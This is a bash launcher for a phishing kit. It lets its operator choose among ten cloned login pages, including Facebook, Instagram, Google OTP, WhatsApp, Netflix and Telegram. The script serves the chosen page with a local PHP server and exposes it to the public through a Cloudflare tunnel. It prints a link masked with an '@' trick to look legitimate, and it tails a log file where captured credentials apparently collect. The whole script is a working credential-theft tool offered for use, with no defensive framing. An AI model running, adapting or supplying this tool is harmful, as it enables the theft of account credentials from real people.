#!/bin/bash
#bash source/logo.sh
figlet -f standard  SOURABH | lolcat
bash source/logo.sh
cat source/options.txt

if [[ -e ".cld.log" ]]; then
	rm -rf ".cld.log"
fi

## Kill already running process
kill_pid() {
	if [[ `pidof php` ]]; then
		killall php > /dev/null 2>&1
	fi
	if [[ `pidof cloudflared` ]]; then
		killall cloudflared > /dev/null 2>&1
	fi
}

kill_pid
read -p "choose an option : " option
echo "selected option :" $option
clear
echo ""
echo ""
printf "\e[100;330m[\e[10m **** ]\e[1;40m\e[10m ITS MY SERVER :\e[1;32m BOYS WAIT 10 SEC.LINK ON THE WAY!\e[0m"
sleep 4
echo ""
# clear
start_cloudflare () {
  cd ../..
    #./cloudflared tunnel -url localhost:4444 --logfile .cld.log
    ./cloudflared tunnel -url localhost:4444 --logfile .cld.log > /dev/null 2>&1 &
    sleep 5
    clear
    echo ""
    cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
    cldflr_link1=${cldflr_link#https://}
    echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$cldflr_link"
    echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$cldflr_link1"
    #ls
    if [[ -e ./$site/log.txt ]];
    then > ./$site/log.txt
    fi 
    echo ""
    echo ""
    tail -f ./$site/log.txt 
}
case $option in 

  1)
    #echo "result of option 1"
    site=sites/facebook
    cd $site
    #php -S 127.0.0.1:4444
    php -S 127.0.0.1:4444 > /dev/null 2>&1 &
    sleep 5
    start_cloudflare
    ;;

  2)
    site=sites/instagram
    cd $site
    php -S 127.0.0.1:4444 > /dev/null 2>&1 &
    sleep 5
    start_cloudflare    
    ;;

  3)
    site=sites/google-otp
    cd $site
    php -S 127.0.0.1:4444 > /dev/null 2>&1 &
    sleep 5
    start_cloudflare
    ;;
    
  4)
    site=sites/instafollow
    cd $site
    php -S 127.0.0.1:4444 > /dev/null 2>&1 &
    sleep 5
    start_cloudflare
    ;;
  5)
    site=sites/whatsapp-phishing
    cd $site
    php -S 127.0.0.1:4444 > /dev/null 2>&1 &
    sleep 5
    start_cloudflare
    ;;
  6)
    site=sites/snapchat
    cd $site
    php -S 127.0.0.1:4444 > /dev/null 2>&1 &
    sleep 5
    start_cloudflare
    ;;
 7)
    site=sites/Netflix
    cd $site
    php -S 127.0.0.1:4444 > /dev/null 2>&1 &
    sleep 5
    start_cloudflare
    ;;
 8)
    site=sites/Zomato-Phishing
    cd $site
    php -S 127.0.0.1:4444 > /dev/null 2>&1 &
    sleep 5
    start_cloudflare
    ;;
9)
    site=sites/telegram
    cd $site
    php -S 127.0.0.1:4444 > /dev/null 2>&1 &
    sleep 5
    start_cloudflare
    ;;

 10)
    site=sites/flipcart
    cd $site
    php -S 127.0.0.1:4444 > /dev/null 2>&1 &
    sleep 5
    start_cloudflare
    ;;
  *)
    echo "result of default option"
    ;;
esac
